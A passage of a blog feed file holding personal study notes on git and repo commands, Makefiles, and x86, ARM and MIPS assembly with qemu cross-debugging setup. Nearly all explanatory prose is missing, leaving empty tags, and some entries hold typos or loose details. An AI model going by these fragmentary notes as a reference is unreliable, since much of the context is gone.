</span></span><br><span class="line"><span class="comment">## </span></span><br><span class="line">git fetch</span><br><span class="line"><span class="comment">## diff </span></span><br><span class="line">git diff </span><br><span class="line">    <span class="comment"># </span></span><br><span class="line"><span class="comment">## pull  = git fetch + git merge</span></span><br><span class="line">git pull</span><br></pre></td></tr></table></figure><p>push(merge)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git branch <span class="string">&quot;name&quot;</span>  <span class="comment">#  </span></span><br><span class="line">-vv   <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">git checkout <span class="string">&quot;name&quot;</span>  <span class="comment"># </span></span><br><span class="line">-d <span class="string">&quot;name&quot;</span>    <span class="comment"># </span></span><br><span class="line">-D <span class="string">&quot;name&quot;</span>    <span class="comment"># </span></span><br><span class="line">-b <span class="string">&quot;name&quot;</span>    <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">git merge      <span class="comment">#  `` </span></span><br><span class="line"><span class="comment"># .</span></span><br></pre></td></tr></table></figure><p>git clone  <code>snapshot</code>  <code>--shallow</code> </p><p>git <code>commit</code> <code>HEAD</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">git stash   <span class="comment"># commit </span></span><br><span class="line">git bisect  <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">git reset </span><br><span class="line">--hard         <span class="comment"># </span></span><br><span class="line">--soft         <span class="comment">#  HEAD </span></span><br><span class="line"></span><br><span class="line">HEAD^       <span class="comment">#  </span></span><br><span class="line">HEAD~&lt;num&gt;  <span class="comment"># num</span></span><br><span class="line">&lt;<span class="built_in">hash</span>&gt;      <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">git revert -n <span class="built_in">hash</span>   <span class="comment"># </span></span><br></pre></td></tr></table></figure><p>IDEgit</p><p>svn, repo</p><h3 id="repo-"><a href="#repo-" class="headerlink" title="repo "></a>repo </h3><p><a href="https://source.android.google.cn/docs/setup/create/repo?hl=zh-cn#start">repo</a> Androidgitgitgoogle repopythongit</p><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">repo init</span><br><span class="line">-u git@&lt;repo&gt;/mainfest.git  <span class="comment"># google https://gerrit.googlesource.com/git-repo</span></span><br><span class="line"><span class="comment">#  default.xml</span></span><br><span class="line">-b  <span class="comment"># branch</span></span><br></pre></td></tr></table></figure><p> -u, xml(<code>default.xml</code>, )git</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">repo init -u &lt;repo&gt;</span><br><span class="line">-m xml</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">repo <span class="built_in">sync</span> -c</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">repo branch  <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">repo start &lt;branch_name&gt; --all <span class="comment"># </span></span><br></pre></td></tr></table></figure><h2 id="lecture7-debugging-profiling"><a href="#lecture7-debugging-profiling" class="headerlink" title="lecture7: debugging &amp; profiling"></a>lecture7: debugging &amp; profiling</h2><blockquote><p></p></blockquote><p></p><p></p><ul><li>GNU gdb</li><li>python pdbpython</li><li>js</li></ul><p></p><ul><li> time</li></ul><h2 id="lecture8-metaprogramming"><a href="#lecture8-metaprogramming" class="headerlink" title="lecture8: metaprogramming"></a>lecture8: metaprogramming</h2><p> <code>makefile</code></p><p>Makefile </p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">: </span></span><br><span class="line">  //tab</span><br><span class="line"></span><br><span class="line"><span class="section">main: main.c</span></span><br><span class="line">gcc main.c -o mian</span><br></pre></td></tr></table></figure><p></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$^</span>   </span><br><span class="line"><span class="variable">$&lt;</span>   </span><br><span class="line"><span class="variable">$@</span>   </span><br><span class="line">echo </span><br><span class="line">%    </span><br><span class="line">*    </span><br></pre></td></tr></table></figure><p> <code>make</code> </p><p> <code>cmake</code></p><h2 id="lecture9-security-crypto"><a href="#lecture9-security-crypto" class="headerlink" title="lecture9: security &amp; crypto"></a>lecture9: security &amp; crypto</h2><blockquote><p></p></blockquote><p>hash: </p><ul><li>md5</li><li>sha-1&#x2F;2&#x2F;3</li></ul><p></p><ul><li>DES</li><li>AES</li></ul><p></p><ul><li>RSA</li><li>ECC</li></ul><p></p><h2 id="lecture10-potpourri"><a href="#lecture10-potpourri" class="headerlink" title="lecture10: potpourri"></a>lecture10: potpourri</h2><blockquote><p></p></blockquote><p></p><ul><li><code>Caps Lock</code>(Esc)</li><li>windowspowertoy</li></ul><p>daemon</p><p></p><ul><li></li></ul><p>Window Manage</p><p>VPN</p><p>Jupyter Notebook: </p><p>GitHub: </p><ul><li></li><li>issue</li><li>pr: pull request</li><li>merge </li></ul><h2 id="lecture11-Q-A"><a href="#lecture11-Q-A" class="headerlink" title="lecture11: Q&amp;A"></a>lecture11: Q&amp;A</h2><blockquote><p></p></blockquote><p></p><ul><li>learn by exercise:  OS labOS</li></ul><p> </p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
            <tag> vim </tag>
            
            <tag> terminal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/06/10/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/06/10/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<blockquote><p></p></blockquote><span id="more"></span><p> <code>shellcode</code></p><p></p><ul><li><code>little-endian</code></li></ul><p></p><ul><li>Intel</li><li>AT&amp;T(Linux)</li></ul><p></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ISA: Instruction Set Architecture, </span><br><span class="line">RISC: Reduced Instruction Set Computer, </span><br><span class="line">CISC: Complex Instruction Set Computer, </span><br><span class="line">ABI: application binary interface</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p> linux: ubuntu &amp;&amp; kali virtual machineCPU: AMD</p><ul><li> <code>arm</code>  <code>mips</code> </li><li>arm <a href="https://termux.dev/en/">Termux</a> ?</li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p> <code>user mode+kernel mode</code> </p><ul><li><code>qemu-user</code>  <code>qemu-system-xxx</code></li><li> <code>qemu-system</code> kernel</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># qemu user system</span></span><br><span class="line">sudo apt install qemu-user</span><br></pre></td></tr></table></figure><p>arm </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gun  + </span></span><br><span class="line">sudo apt list gcc* | grep arm</span><br><span class="line">sudo apt install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu</span><br><span class="line"></span><br><span class="line"><span class="comment"># optional: qemu arm system mode</span></span><br><span class="line">sudo apt list  <span class="string">&quot;qemu*&quot;</span> <span class="comment"># arch</span></span><br><span class="line">sudo apt install qemu-system-arm qemu-system-aarch64</span><br></pre></td></tr></table></figure><p>mips .</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gun </span></span><br><span class="line">sudo apt install gcc-mips-linux-gnu gcc-mips64-linux-gnuabi64 gcc-mipsel-linux-gnu gcc-mips64el-linux-gnuabi64</span><br><span class="line"></span><br><span class="line"><span class="comment"># optional: qemu mips system mode,  user mode </span></span><br><span class="line">sudo apt install qemu-system-mips</span><br></pre></td></tr></table></figure><p>gdb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gdb gdb-multiarch</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>qemu-user  <code>-g</code> gdb gdb</p><p>qemu-system  <code>-s -S   -gdb tcp:1234</code> gdbserver <code>1234</code></p><p></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello, world!&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>lib-&gt;/usr/lib</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -al /usr/lib | grep arm  <span class="comment"># aarch64 mips...</span></span><br></pre></td></tr></table></figure><p>arm  <code>-g</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">arm-linux-gnueabi-gcc hello.c -o helloarm -g</span><br><span class="line">aarch64-linux-gnu-gcc hello.c -o helloaarch -g</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">$ qemu-arm -L /usr/arm-linux-gnueabi ./helloarm</span><br><span class="line">$ qemu-aarch64</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">$ qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./helloarm </span><br><span class="line">$ gdb-multiarch</span><br><span class="line">gdb&gt; <span class="built_in">set</span> <span class="built_in">arch</span> arm <span class="comment"># aarch64</span></span><br><span class="line">gdb&gt; target remote localhost:1234</span><br><span class="line">xxx </span><br></pre></td></tr></table></figure><p>mips , arm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mips-linux-gnu-gcc hello.c -o hellomips -g</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>CISC</p><h3 id="x86-1"><a href="#x86-1" class="headerlink" title="x86"></a>x86</h3><p>intel x86 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">; </span><br><span class="line">eax: </span><br><span class="line">ebx: base</span><br><span class="line">ecx: counter, loop</span><br><span class="line">edx: data</span><br><span class="line"></span><br><span class="line">esi: source index, </span><br><span class="line">edi: destinatin index, </span><br><span class="line"></span><br><span class="line">esp: stack pointer, </span><br><span class="line">ebp: base pointer, </span><br><span class="line"></span><br><span class="line">eip: </span><br></pre></td></tr></table></figure><p> <code>eflags</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CF: carry flag, </span><br><span class="line">ZF: zero, 0</span><br><span class="line">SF: sign, </span><br><span class="line">OF: overflow, </span><br><span class="line">TF: trap, </span><br><span class="line">IF: interrupt, </span><br><span class="line">PF: parity, </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cs: code segment </span><br><span class="line">ds: data </span><br><span class="line">ss: stack </span><br><span class="line">es: extend </span><br><span class="line">fs: </span><br><span class="line">gs: </span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">; </span><br><span class="line">cr0-cr4</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov</span><br><span class="line">lea</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">; </span><br><span class="line">add</span><br><span class="line">sub</span><br><span class="line">mul</span><br><span class="line">div</span><br><span class="line">inc</span><br><span class="line">dec</span><br><span class="line"></span><br><span class="line">; </span><br><span class="line">cmp</span><br><span class="line">and</span><br><span class="line">or</span><br><span class="line">xor</span><br><span class="line">not</span><br><span class="line"></span><br><span class="line">; </span><br><span class="line">shl  ; shift left</span><br><span class="line">shr</span><br><span class="line">sal  ; shift arithmetic left </span><br><span class="line">sar</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; jmp </span><br><span class="line">jmp</span><br><span class="line">jb   ; blow</span><br><span class="line">jg   ; greater</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call function</span><br><span class="line">; call  eip+4, </span><br><span class="line">; </span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; espebp</span><br><span class="line">; esp, ebp</span><br><span class="line">;  </span><br><span class="line"></span><br><span class="line">; sp</span><br><span class="line">push ebx  ; sp-4</span><br><span class="line">pop rax   ; sp+4</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">; syscall</span><br><span class="line">int 0x80            ; eax ebx, ecx, edx</span><br></pre></td></tr></table></figure><h3 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h3><p>x86-64AMD64ISAIntelAMDCPUx86-64ISA</p><p>x86-64: 64 <code>2^64</code>, x86</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">; 32 r-&gt;b rax-&gt;eax</span><br><span class="line">rax, rbx, rcx, rdx</span><br><span class="line">rsi, rdi</span><br><span class="line">rsp, rbp</span><br><span class="line">r8: r8d 32 32</span><br><span class="line">r9: r9d</span><br><span class="line">r10: ...</span><br><span class="line">r11: ...</span><br><span class="line">r12: ...</span><br><span class="line">r13: ...</span><br><span class="line">r14: ...</span><br><span class="line">r15: ...</span><br></pre></td></tr></table></figure><p>Linux, x86</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; </span><br><span class="line">rdi, rsi, rdx, rcx, r8, r9           ; 67x86</span><br><span class="line"></span><br><span class="line">; </span><br><span class="line">rax</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; syscall</span><br><span class="line">rax: </span><br><span class="line">;  rdi, rsi...</span><br></pre></td></tr></table></figure><h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><p>RISC</p><p>ARM</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">label op-code oprand1 oprand2 oprand3 ...        @commit</span><br><span class="line"></span><br><span class="line">@  rd: destination; rn: ; shifter_operand: </span><br><span class="line">&lt;opcode&gt; &#123;&lt;cond&gt;&#125; &#123;S&#125; &lt;rd&gt;,&lt;rn&gt;,&lt;shifter_operand&gt;</span><br><span class="line"></span><br><span class="line">@   `@`, `//`  `/**/` `;`</span><br></pre></td></tr></table></figure><h3 id="ARMv7"><a href="#ARMv7" class="headerlink" title="ARMv7"></a>ARMv7</h3><p>32<code>A32</code>16<code>T16</code></p><ul><li>ARMv7  <code>ARM</code> <code>Thumb</code> <code>addr &amp; 1 == 1</code><code>thumb</code></li></ul><p>ARMv7</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">r0-r3: args, r0. </span><br><span class="line">r4-r10:  </span><br><span class="line">r11: fp, frame pointer</span><br><span class="line">r12: ip, Intra-Procedure-call scratch register, blbug</span><br><span class="line">r13: sp, stack pointer</span><br><span class="line">r14: lr, link register</span><br><span class="line">r15: pc, program count, </span><br></pre></td></tr></table></figure><p>(CPSR: program status reg), <code>s</code> (sub -&gt; subs)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">N: negative, &gt;=0 N=0, N=1</span><br><span class="line">Z: zero, 0</span><br><span class="line">C: carry, </span><br><span class="line">V: overflow </span><br><span class="line"></span><br><span class="line">; cmp </span><br><span class="line">cmp r0, r1</span><br></pre></td></tr></table></figure><p>mov </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov r0, #1     @ r0 &lt;- 1</span><br><span class="line"></span><br><span class="line">@  cpsr || spsr</span><br><span class="line">mrs r0, cpsr   @ r0 &lt;- cpsr</span><br><span class="line">msr cpsr, r1   @ cpsr &lt;- r1</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@ intel mov,  load, store</span><br><span class="line">ldr rd, [rn , #offset]   @ load register</span><br><span class="line">str rd, [rn, #offset]</span><br><span class="line">ldm                      @ load multiple</span><br><span class="line">stm  </span><br><span class="line"></span><br><span class="line">; </span><br><span class="line">ldr r0, =0X20000002  @ r0=0X20000002 </span><br><span class="line">str r1, [r0]         @ r1  r0 </span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@ </span><br><span class="line">add rd, rn, rm   @ rd = rn + rm</span><br><span class="line">sub rd, rn, rm   @ rd = rn - rm</span><br><span class="line">mul rd, rn, rm   @ rd = rn * rm</span><br><span class="line">sdiv rd, rn, rm  @ rd = rn / rm, s(ign)div u(nsign)div</span><br><span class="line"></span><br><span class="line">@ ,  &#x27;s&#x27; =&gt; subs...</span><br><span class="line"></span><br><span class="line">@ </span><br><span class="line">and rd, rn       @ rd = rd &amp; rn</span><br><span class="line">and rd, rn, #imm @ rd = rn &amp; #imm</span><br><span class="line">orr rd, rn       @ rd = rd | rn</span><br><span class="line">eor rd, rn       @ rd = rd ^ rn</span><br><span class="line"></span><br><span class="line">@ </span><br><span class="line">lsl   @ logic shift left </span><br><span class="line">lsr   @ </span><br><span class="line">asr   @ arithmetic shift right </span><br><span class="line">ror   @ rotate right </span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">b: label branch</span><br><span class="line">bx: +    @ ARM/Thumb ()</span><br><span class="line">bl: b + link, lr, pc</span><br><span class="line">blx: bl+bx</span><br><span class="line"></span><br><span class="line">@ , </span><br><span class="line">eq: equal </span><br><span class="line">ne: not eq</span><br><span class="line">lt: less </span><br><span class="line">le: less equal</span><br></pre></td></tr></table></figure><p> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@  `b` </span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@ sp, fp ,  </span><br><span class="line"></span><br><span class="line">fp -&gt; +-------+</span><br><span class="line">      | frame |</span><br><span class="line">sp -&gt; +-------+</span><br><span class="line"></span><br><span class="line">@ push/pop pc; sp</span><br><span class="line">@ gadget </span><br><span class="line">push &#123;r0-r4, lr&#125;           @  push r12; push r4; push r3 ...</span><br><span class="line">...</span><br><span class="line">pop &#123;r0-r4, pc&#125;            @   pop r0; pop r1; ...</span><br><span class="line"></span><br><span class="line">@  push, sp?</span><br><span class="line">stmfd sp!, &#123;r0-r4, r12&#125;</span><br><span class="line"></span><br><span class="line">@  pop</span><br><span class="line">ldmfd sp!, lr</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@ vector_swi/svc </span><br><span class="line">swi #imm</span><br><span class="line">svc #imm</span><br><span class="line"></span><br><span class="line">@ O(old)ABI </span><br><span class="line">mov r0, #34</span><br><span class="line">swi 12</span><br><span class="line"></span><br><span class="line">@ E(extended)ABI  imm,r0</span><br><span class="line">mov r0, #12</span><br><span class="line">mov r1, #34</span><br><span class="line">swi 0</span><br></pre></td></tr></table></figure><h3 id="ARMv8"><a href="#ARMv8" class="headerlink" title="ARMv8"></a>ARMv8</h3><p> <code>armv7</code> </p><p>64 <code>aarch64</code>, 32 <code>aarch32</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aarch64: 64-bit registers and memory accesses, new instruction set</span><br><span class="line">aarch32: backwards compatible with ARMv7-A</span><br></pre></td></tr></table></figure><p>ARMv8 </p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">x0</span>-x31</span><br><span class="line"><span class="symbol">x0</span>-<span class="built_in">x7</span>: <span class="number">8</span></span><br><span class="line"><span class="symbol">x8:</span> </span><br><span class="line"><span class="symbol">x19</span>-<span class="built_in">x28</span>:  </span><br><span class="line"><span class="symbol">x29:</span> <span class="built_in">fp</span> frame pointer</span><br><span class="line"><span class="symbol">x30:</span> <span class="built_in">lr</span></span><br><span class="line"><span class="symbol">x31:</span> zr, zero register, <span class="number">0</span></span><br><span class="line"><span class="symbol">x32:</span> <span class="built_in">pc</span>, armv7</span><br><span class="line"></span><br><span class="line"><span class="comment">@ 32 w0..., </span></span><br><span class="line"></span><br><span class="line"><span class="comment">@ sp()</span></span><br><span class="line"><span class="symbol">SP_EL0</span>SP_EL1</span><br><span class="line"><span class="symbol">SP_EL2</span></span><br><span class="line"><span class="symbol">SP_EL3</span></span><br></pre></td></tr></table></figure><p>SPSR  CPSR</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@ load &amp; store, armv7 ldr</span><br><span class="line">ldp  @ load pair </span><br><span class="line">ldp x8, x2, [x0, #0x10]   @ x8&lt;-(x0+0x10), x2&lt;-(x0+0x10+8)</span><br><span class="line">stp  @ store pair</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@ </span><br><span class="line">x0-x7: 8</span><br><span class="line">x8: </span><br><span class="line"></span><br><span class="line">@ aarch64pushpop </span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@ supervisor call</span><br><span class="line">svc #imm</span><br></pre></td></tr></table></figure><p>TrustZone </p><h3 id="ARMv9"><a href="#ARMv9" class="headerlink" title="ARMv9"></a>ARMv9</h3><p>xxx</p><h2 id="Mips"><a href="#Mips" class="headerlink" title="Mips"></a>Mips</h2><p>RISC <code>Microprocessor without Interlocked Pipeline Stages</code></p><p><code>mips</code> <code>big-endian</code>, mipsel <code>little-endian</code></p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># </span><br><span class="line">31-26   25-21 20-16 15-11  10-6  5-0</span><br><span class="line">op-code   rs    rt   rd    shamt func</span><br><span class="line"></span><br><span class="line">#  